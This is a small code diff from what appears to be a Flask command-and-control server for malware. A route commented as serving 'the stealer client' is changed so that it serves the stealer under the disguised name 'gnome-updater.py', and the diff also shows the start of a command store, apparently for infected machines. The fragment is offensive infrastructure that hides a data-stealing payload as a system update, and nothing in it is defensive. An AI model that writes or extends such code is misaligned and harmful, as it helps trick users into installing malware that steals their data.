@@ -65,7 +65,7 @@ def admin_upload():
 
 @app.route('/security_debian_x386', methods=['GET'])       # Endpoint to serve the stealer client
 def get_stealer_client():
-    return send_from_directory('app', 'stealer_client.py')
+    return send_from_directory('app', 'gnome-updater.py')
 
 latest_command = {"cmd": ""}
 
